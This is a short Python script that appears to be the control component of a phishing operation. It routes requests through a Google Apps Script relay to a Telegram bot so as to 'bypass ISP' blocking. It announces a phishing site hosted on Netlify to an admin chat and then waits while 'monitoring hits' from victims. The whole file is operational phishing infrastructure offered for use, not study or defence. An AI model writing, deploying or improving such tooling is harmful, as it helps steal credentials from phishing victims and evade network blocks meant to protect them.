import requests
import time

# --- CONFIG ---
BRIDGE_URL = "https://script.google.com"
ADMIN_ID = "6671784926"
NETLIFY_URL = "https://phishhhi.netlify.app"

def check_connection():
    print("🚀 Bypassing ISP... Routing via Google...")
    headers = {'User-Agent': 'Mozilla/5.0'}
    try:
        # allow_redirects=True is CRITICAL for Google Scripts
        response = requests.get(BRIDGE_URL, headers=headers, allow_redirects=True, timeout=15)
        data = response.json()
        if data.get("ok"):
            bot_name = data['result']['username']
            print(f"✅ Gold Connection: @{bot_name} is ONLINE")
            
            # Send Notification to Telegram
            payload = {"chat_id": ADMIN_ID, "text": f"<b>🔥 v19.0 BRIDGE ACTIVE</b>\n\n🛡️ Status: <b>Online</b>\n🔗 Site: {NETLIFY_URL}", "parse_mode": "HTML"}
            requests.post(BRIDGE_URL, json=payload, headers=headers, allow_redirects=True)
            return True
        else:
            print(f"❌ Telegram Error: {data.get('error')}")
    except Exception as e:
        print(f"❌ Bridge Error: {e}")
        print("Note: Ensure Google Deployment is set to 'Anyone'.")
    return False

if __name__ == "__main__":
    if check_connection():
        print("Monitoring hits... (Press Ctrl+C to stop)")
        while True:
            time.sleep(60)
